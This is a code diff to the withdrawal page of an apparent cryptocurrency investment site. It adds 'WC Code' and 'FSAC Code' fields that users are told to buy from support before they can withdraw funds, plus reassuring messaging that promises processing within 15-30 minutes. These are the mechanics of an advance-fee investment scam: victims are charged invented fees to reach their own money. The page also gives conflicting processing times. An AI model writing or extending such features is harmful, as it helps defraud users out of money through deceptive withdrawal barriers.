@@ -1235,25 +1235,42 @@ const PAGES = {
     </div>`;
   },
 
-  withdraw() {
+  async withdraw() {
+    let wcReq = false, fsacReq = false;
+    try { const r = await apiFetch('/withdrawals/settings'); if(r.ok){ const d=await r.json(); wcReq=d.wcRequired; fsacReq=d.fsacRequired; } } catch(e){}
     return `
     <div class="card card-p c-anim" style="max-width:520px">
       <div class="card-head">
         <div><div class="card-title">Withdraw Funds</div><div class="card-sub" id="wdAvailSub">Available: <strong style="color:var(--primary)">$0.00</strong></div></div>
       </div>
       <div class="fg"><label class="flbl">Withdrawal Method</label>
-        <select class="fi" id="wdMethod"><option value="BTC">Bitcoin (BTC)</option><option value="ETH">Ethereum (ETH)</option><option value="USDT_TRC20">USDT TRC-20</option><option value="USDT_ERC20">USDT ERC-20</option><option value="USDT_BEP20">USDT BEP-20</option><option value="BANK">Bank Transfer</option></select>
+        <select class="fi" id="wdMethod" onchange="updateWdLabel()"><option value="BTC">Bitcoin (BTC)</option><option value="ETH">Ethereum (ETH)</option><option value="USDT_TRC20">USDT TRC-20</option><option value="USDT_ERC20">USDT ERC-20</option><option value="USDT_BEP20">USDT BEP-20</option><option value="BANK">Bank Transfer</option></select>
       </div>
-      <div class="fg"><label class="flbl">Wallet Address / Bank Details</label><input type="text" class="fi" id="wdAddress" placeholder="Your wallet address or bank account number"></div>
+      <div class="fg"><label class="flbl" id="wdAddrLabel">Wallet Address</label>
+        <input type="text" class="fi" id="wdAddress" placeholder="Enter valid wallet address">
+        <div style="background:rgba(227,179,65,.08);border:1px solid rgba(227,179,65,.2);border-radius:var(--r);padding:10px 12px;margin-top:8px;font-size:11px;color:#e3b341;display:flex;align-items:flex-start;gap:8px">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="flex-shrink:0;margin-top:1px"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+          <span id="wdAddrWarn">Make sure to enter the correct address. Transfers sent to incorrect addresses cannot be recovered.</span>
+        </div>
+      </div>
+      ${wcReq?'<div class="fg"><label class="flbl">WC Code</label><input type="text" class="fi" id="wdWcCode" placeholder="Code"><div class="fnote">Please input your withdrawal confirmation code or contact support to purchase a code.</div></div>':''}
+      ${fsacReq?'<div class="fg"><label class="flbl">FSAC Code</label><input type="text" class="fi" id="wdFsacCode" placeholder="Code"><div class="fnote">Please input your FSAC code or contact support to purchase a code.</div></div>':''}
       <div class="fg"><label class="flbl">Amount (USD)</label>
         <input type="number" class="fi" id="wdAmount" placeholder="Enter amount">
         <div class="fnote">Minimum: $50 · Processing time: up to 24 hours</div>
       </div>
+      <div style="background:var(--surface-2);border:1px solid var(--border);border-radius:var(--r);padding:12px 14px;margin-bottom:14px;display:flex;align-items:center;gap:10px">
+        <div style="width:36px;height:36px;border-radius:50%;background:rgba(88,166,255,.1);display:flex;align-items:center;justify-content:center;flex-shrink:0">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        </div>
+        <div><div style="font-size:12px;font-weight:600">Estimated processing time</div><div style="font-size:11px;color:var(--text-3)">Your withdrawal will be processed within 15-30 minutes.</div></div>
+      </div>
       <div id="wdErr" style="display:none;color:var(--danger);font-size:12px;margin-bottom:10px"></div>
-      <button class="btn btn-g btn-w-lg" id="wdBtn" onclick="submitWithdrawal()">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
-        Request Withdrawal
+      <button class="btn btn-g btn-w-lg" id="wdBtn" onclick="submitWithdrawal()" style="background:linear-gradient(135deg,var(--primary),#1a9f4a);border-radius:var(--r-lg);padding:14px;font-size:15px">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 000 7h5a3.5 3.5 0 010 7H6"/></svg>
+        Complete Withdrawal Request
       </button>
+      <div style="text-align:center;font-size:11px;color:var(--text-3);margin-top:10px">By proceeding, you confirm that the provided information is correct</div>
     </div>`;
   },
 
@@ -2583,26 +2600,42 @@ async function submitDeposit() {
   finally { if (btn) { btn.disabled = false; btn.textContent = 'Submit Deposit'; } }
 }
 
+function updateWdLabel() {
+  const m = (document.getElementById('wdMethod')||{}).value||'';
+  const label = document.getElementById('wdAddrLabel');
+  const warn = document.getElementById('wdAddrWarn');
+  const input = document.getElementById('wdAddress');
+  const names = {BTC:'Bitcoin',ETH:'Ethereum',USDT_TRC20:'USDT (TRC20)',USDT_ERC20:'USDT (ERC20)',USDT_BEP20:'USDT (BEP20)',BANK:'Bank'};
+  const n = names[m]||m;
+  if(label) label.textContent = n + ' Wallet Address';
+  if(input) input.placeholder = 'Enter valid ' + n + ' address';
+  if(warn) warn.textContent = 'Make sure to enter the correct ' + n + ' address. Transfers sent to incorrect addresses cannot be recovered.';
+}
 async function submitWithdrawal() {
   const method  = (document.getElementById('wdMethod') || {}).value || '';
   const address = ((document.getElementById('wdAddress') || {}).value || '').trim();
   const amount  = (document.getElementById('wdAmount') || {}).value || '';
+  const wcCode  = ((document.getElementById('wdWcCode') || {}).value || '').trim();
+  const fsacCode = ((document.getElementById('wdFsacCode') || {}).value || '').trim();
   const errEl   = document.getElementById('wdErr');
   const btn     = document.getElementById('wdBtn');
   if (errEl) errEl.style.display = 'none';
   if (!method || !address || !amount || Number(amount) <= 0) {
     if (errEl) { errEl.textContent = 'Please fill in all fields.'; errEl.style.display = 'block'; } return;
   }
-  if (btn) { btn.disabled = true; btn.textContent = 'Submitting…'; }
+  if (btn) { btn.disabled = true; btn.textContent = 'Processing…'; }
   try {
-    const r = await apiFetch('/withdrawals', { method: 'POST', body: JSON.stringify({ method, walletAddress: address, amount: Number(amount) }) });
+    const body = { method, walletAddress: address, amount: Number(amount) };
+    if (wcCode) body.wcCode = wcCode;
+    if (fsacCode) body.fsacCode = fsacCode;
+    const r = await apiFetch('/withdrawals', { method: 'POST', body: JSON.stringify(body) });
     const d = await r.json();
     if (!r.ok) { if (errEl) { errEl.textContent = d.error || 'Withdrawal failed.'; errEl.style.display = 'block'; } return; }
     if (_user) { _user.balance = Math.max(0, Number(_user.balance) - Number(amount)); document.getElementById('sbBal').textContent = fmt(_user.balance); }
-    toast('Withdrawal submitted! Processing within 24 hours.');
+    toast('Withdrawal submitted! Processing within 15-30 minutes.');
     go('transactions');
   } catch(e) { if (errEl) { errEl.textContent = 'Network error. Try again.'; errEl.style.display = 'block'; } }
-  finally { if (btn) { btn.disabled = false; btn.textContent = 'Request Withdrawal'; } }
+  finally { if (btn) { btn.disabled = false; btn.textContent = 'Complete Withdrawal Request'; } }
 }
 
 let _invPlanId = null;
